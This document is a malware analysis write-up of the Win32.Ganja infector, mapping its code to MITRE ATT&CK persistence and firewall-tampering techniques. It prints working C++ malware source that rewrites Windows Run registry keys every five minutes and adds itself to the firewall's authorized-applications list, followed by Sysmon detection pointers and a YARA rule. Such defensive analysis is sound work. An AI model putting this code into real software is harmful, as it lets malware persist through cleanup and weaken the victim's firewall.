# Win32.Ganja - Timed Registry and Firewall Persistence Loop

**Repository:** MalwareSourceCode-main  
**File Path:** `Win32/Infector/Win32.Ganja.c/Win32.Ganja.c/wGanja.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1547.001 (Registry Run Keys), T1562.004 (Disable or Modify System Firewall)

---

## Overview

The Win32.Ganja file infector establishes persistence through a periodic loop that rewrites its configuration to the registry every five minutes. This technique ensures the malware survives manual or automated cleanup attempts. The persistence logic is notable for its dual-pronged approach: it writes to both the `HKLM` and `HKCU` `Run` keys for autostart resilience, and it adds an exception for itself to the Windows Firewall. This combination guarantees both execution at startup and unimpeded network communication.

---

## Code Snippet 1: Five-Minute Persistence Loop

```cpp
DWORD WINAPI RegThread(LPVOID myvoid)
{
    HKEY Install;
    char pfad[MAX_PATH];
    char szModule[MAX_PATH];
    GetModuleFileName(0, szModule, sizeof(szModule));  // Get full path to malware executable

    for( ;; ) {  // Infinite loop

        // VECTOR 1: HKEY_LOCAL_MACHINE\...\Run (system-wide autostart)
        if( RegCreateKeyEx( HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                            0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL ) == ERROR_SUCCESS ) {
            RegSetValueEx( Install, cfg_regname, 0, REG_SZ, ( unsigned char * )szModule, strlen( szModule ) + 1 );
            RegCloseKey( Install );
        }

        // VECTOR 2: HKEY_CURRENT_USER\...\Run (per-user autostart)
        if( RegCreateKeyEx( HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                            0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL) == ERROR_SUCCESS ) {
            RegSetValueEx( Install, cfg_regname, 0, REG_SZ, ( unsigned char * )szModule, strlen( szModule ) + 1 );
            RegCloseKey( Install );
        }

        // VECTOR 3: Windows Firewall whitelist (authorize application)
        _snprintf( pfad, sizeof( pfad ),"%s:*:Enabled:%s", szModule, cfg_regname );  // Format: "C:\malware.exe:*:Enabled:Ganja"
        if( RegCreateKeyEx( HKEY_LOCAL_MACHINE, 
                           "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 
                            0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Install, NULL) == ERROR_SUCCESS ) {
            RegSetValueEx( Install, szModule, 0, REG_SZ, ( unsigned char * )pfad, strlen( pfad ) + 1 );
            RegCloseKey( Install );
        }

        Sleep( 5 * 60 * 1000 );  // Sleep for 5 minutes (300,000 milliseconds)
    }
    return 0;
}
```

**What it does:**  
The `RegThread` function runs as a continuous background thread. Every five minutes, it performs three actions:
1.  It writes its executable path to the `HKLM\...\Run` key to ensure it runs for all users.
2.  It writes its path to the `HKCU\...\Run` key, providing a fallback if it lacks permissions for HKLM.
3.  It adds an entry to the Windows Firewall's `AuthorizedApplications` list, ensuring it can receive inbound network connections.
The `Sleep(300000)` call creates the five-minute interval, balancing persistence with stealth by avoiding the high CPU usage of more aggressive loops.

**Why it's T1547.001 & T1562.004:**  
This code is a prime example of `T1547.001` because it uses the standard `Run` keys to achieve execution at startup. The periodic rewriting is a resilience mechanism for this TTP. It also clearly implements `T1562.004` by directly modifying the firewall policy in the registry. By adding itself to the `AuthorizedApplications` list, it impairs the system's defenses, guaranteeing network access for its C2 communications.

---

## Detection & Evasion

### Sysmon Telemetry

- **Event ID 13: RegistryEvent (Value Set)**: Look for a process that periodically writes to both `Run` keys and the `FirewallPolicy` key. The five-minute interval is a key indicator.
  - **TargetObject:**
    - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
    - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
    - `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List`
- **Event ID 10: ProcessAccess**: The malware process may be seen opening handles to `lsass.exe` or other system processes for credential access or process injection, which often follows successful persistence.

### YARA Rule

```yara
rule T1547_Persistence_Win32_Ganja_Loop
{
    meta:
        author = "Vengful"
        description = "Detects strings related to the Win32.Ganja 5-minute persistence loop."
        reference = "Internal Research"
        date = "2025-11-25"
        mitre_attack = "T1547.001, T1562.004"

    strings:
        // Function name for the persistence thread
        $s1 = "RegThread" wide ascii

        // Unique firewall registry path
        $s2 = "SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List" wide ascii
        
        // Format string for the firewall exception
        $s3 = "%s:*:Enabled:%s" wide ascii

    condition:
        uint16(0) == 0x5A4D and // MZ header
        all of them
}
```
